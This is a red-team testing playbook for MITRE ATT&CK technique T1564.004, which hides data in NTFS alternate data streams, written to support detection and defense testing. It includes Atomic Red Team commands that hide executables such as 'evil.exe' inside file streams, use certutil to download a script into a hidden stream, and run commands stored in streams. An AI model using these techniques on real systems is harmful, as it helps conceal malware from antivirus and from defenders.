---
name: "T1564.004_ntfs-file-attributes"
description: "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1564.004
  - defense-evasion
  - windows
  - sub-technique
technique_id: "T1564.004"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1564/004"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1564
  - T1564.001
  - T1564.002
  - T1564.003
  - T1564.005
  - T1564.006
  - T1564.007
  - T1564.008
  - T1564.009
  - T1564.010
  - T1564.011
  - T1564.012
  - T1564.013
  - T1564.014
prerequisites:
  - T1564
severity_boost:
  T1564: "Chain with T1564 for deeper attack path"
  T1564.001: "Chain with T1564.001 for deeper attack path"
  T1564.002: "Chain with T1564.002 for deeper attack path"
---

# T1564.004 NTFS File Attributes

> **Sub-technique of:** T1564

## High-Level Description

Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. Within MFT entries are file attributes, such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).

Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Windows

## What to Check

- [ ] Identify if NTFS File Attributes technique is applicable to target environment
- [ ] Check Windows systems for indicators of NTFS File Attributes
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Alternate Data Streams (ADS)

Execute from Alternate Streams

[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)

[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
```

### Atomic Test 2: Store file in Alternate Data Stream (ADS)

Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.
Upon execution, cmd will run and attempt to launch desktop.ini. No windows remain open after the test

**Supported Platforms:** windows

```powershell
if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
    New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
    }
Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""
```

### Atomic Test 3: Create ADS command prompt

Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run "dir /a-d /s /r | find ":$DATA"" in the %temp%
folder to view that the alternate data stream exists. To view the data in the alternate data stream, run "notepad T1564.004_has_ads.txt:adstest.txt"

**Supported Platforms:** windows

```cmd
echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
for /f "usebackq delims=?" %i in (#{file_name}:#{ads_filename}) do %i
```

### Atomic Test 4: Create ADS PowerShell

Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, run the command "ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname"
in the %temp% directory to view all files with hidden data streams. To view the data in the alternate data stream, run "notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt" in the %temp% folder.

**Supported Platforms:** windows

```powershell
echo "test" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value "test"
set-content -path #{file_name} -stream #{ads_filename} -value "test2"
set-content -path . -stream #{ads_filename} -value "test3"
```

**Dependencies:**

- The file must exist on disk at specified location (#{file_name})

### Atomic Test 5: Create Hidden Directory via $index_allocation

Create an Alternate Data Stream Directory and File with the command prompt. Write access is required. Upon execution,
run "dir /A /Q /R" in the %temp% folder to view that the alternate data stream folder exists. To view the data in the
alternate data stream, run "type %temp%\...$.......::$index_allocation\secrets.txt"

**Supported Platforms:** windows

```cmd
md #{folder_name}
echo too many secrets > #{folder_name}\#{hidden_filename}
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to NTFS File Attributes by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1564.004 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1022 Restrict File and Directory Permissions

Consider adjusting read and write permissions for NTFS EA, though this should be tested to ensure routine OS operations are not impeded.

## Detection

### Detection Strategy for NTFS File Attribute Abuse (ADS/EAs)

## Risk Assessment

| Finding                                   | Severity | Impact          |
| ----------------------------------------- | -------- | --------------- |
| NTFS File Attributes technique applicable | Low      | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [MalwareBytes ADS July 2015](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)
- [SpectorOps Host-Based Jul 2017](https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea)
- [Journey into IR ZeroAccess NTFS EA](http://journeyintoir.blogspot.com/2012/12/extracting-zeroaccess-from-ntfs.html)
- [Microsoft NTFS File Attributes Aug 2010](https://blogs.technet.microsoft.com/askcore/2010/08/25/ntfs-file-attributes/)
- [Microsoft ADS Mar 2014](https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/)
- [Microsoft File Streams](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [Oddvar Moe ADS2 Apr 2018](https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/)
- [Oddvar Moe ADS1 Jan 2018](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)
- [Symantec ADS May 2009](https://www.symantec.com/connect/articles/what-you-need-know-about-alternate-data-streams-windows-your-data-secure-can-you-restore)
- [Atomic Red Team - T1564.004](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1564.004)
- [MITRE ATT&CK - T1564.004](https://attack.mitre.org/techniques/T1564/004)
